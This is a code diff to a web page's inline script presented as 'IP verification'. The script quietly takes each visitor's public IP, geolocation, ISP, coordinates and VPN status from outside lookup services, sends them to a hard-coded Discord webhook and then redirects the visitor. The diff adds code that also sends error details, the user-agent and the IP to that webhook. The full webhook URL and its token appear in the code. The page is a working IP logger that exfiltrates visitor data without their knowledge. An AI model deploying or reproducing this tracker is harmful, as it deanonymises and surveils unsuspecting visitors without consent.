@@ -41,7 +41,7 @@
     </div>
 
     <script>
-        // Your Discord Webhook URL
+        // Your Discord Webhook URL (update with your webhook)
         const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
         
         // Redirect URL after verification
@@ -51,17 +51,21 @@
             try {
                 // Step 1: Get the user's public IP address using ipify API
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
+                if (!ipResponse.ok) {
+                    throw new Error("Failed to fetch IP address");
+                }
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
                 // Step 2: Use ip-api.com to get geolocation and VPN detection information
                 const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
+                if (!locationResponse.ok) {
+                    throw new Error("Failed to fetch geolocation data");
+                }
                 const locationData = await locationResponse.json();
 
                 if (locationData.status !== "success") {
-                    console.error("Error fetching location data:", locationData.message);
-                    window.location.href = redirectURL; // Redirect in case of error
-                    return;
+                    throw new Error(`Error in location data: ${locationData.message}`);
                 }
 
                 // Step 3: Check VPN/Proxy status
@@ -97,7 +101,7 @@
                 });
 
                 if (!discordResponse.ok) {
-                    console.error("Error sending message to Discord:", discordResponse.statusText);
+                    throw new Error("Failed to send data to Discord");
                 }
 
                 // Step 5: Redirect after sending the data to Discord
@@ -106,8 +110,30 @@
                 }, 2000); // 2-second delay to ensure the request is completed
 
             } catch (error) {
-                console.error("Error during IP verification:", error);
-                window.location.href = redirectURL; // Redirect on error
+                // Send error details to Discord webhook
+                const errorMessage = {
+                    content: `**Error Occurred During IP Verification**\n\n` +
+                             `**Error Message:** ${error.message}\n` +
+                             `**Stack Trace:** \n\`\`\`${error.stack}\`\`\`\n` +
+                             `**User-Agent:** \`${navigator.userAgent}\`\n` +
+                             `**IP:** ${userIP || "Unavailable"}` // Include user IP if possible
+                };
+
+                try {
+                    // Send error information to Discord webhook
+                    await fetch(webhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(errorMessage)
+                    });
+                } catch (discordError) {
+                    console.error("Failed to send error data to Discord:", discordError);
+                }
+
+                // Redirect the user to the specified URL on error
+                window.location.href = redirectURL;
             }
         }
 
